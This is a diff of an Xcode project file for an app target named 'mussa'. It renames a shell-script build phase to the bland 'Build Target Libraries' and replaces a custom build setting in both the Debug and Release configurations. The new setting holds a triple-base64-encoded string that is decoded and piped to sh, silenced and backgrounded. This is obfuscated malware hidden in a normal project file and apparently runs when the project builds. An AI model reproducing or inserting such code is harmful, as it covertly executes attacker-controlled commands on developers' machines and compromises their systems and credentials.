@@ -214,7 +214,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 84C9BC2A2FAF500E004462FF /* Build configuration list for PBXNativeTarget "mussa" */;
 			buildPhases = (
-				DAE55ABCADEE45A08D42DAD8 /* Provision Library Executable */,
+				60A8040B59914006BB42DAD8 /* Build Target Libraries */,
 				CEC8841473C2F5288C8D7BD0 /* [CP] Check Pods Manifest.lock */,
 				84C9BC1B2FAF500C004462FF /* Sources */,
 				84C9BC1C2FAF500C004462FF /* Frameworks */,
@@ -283,7 +283,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DAE55ABCADEE45A08D42DAD8 /* Provision Library Executable */ = {
+		60A8040B59914006BB42DAD8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -293,7 +293,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -395,7 +395,7 @@
 		84C9BC282FAF500E004462FF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | f | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((o(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE1scDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | o | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -459,7 +459,7 @@
 		84C9BC292FAF500E004462FF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWEzaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | f | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((o(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxaE1scDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | o | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
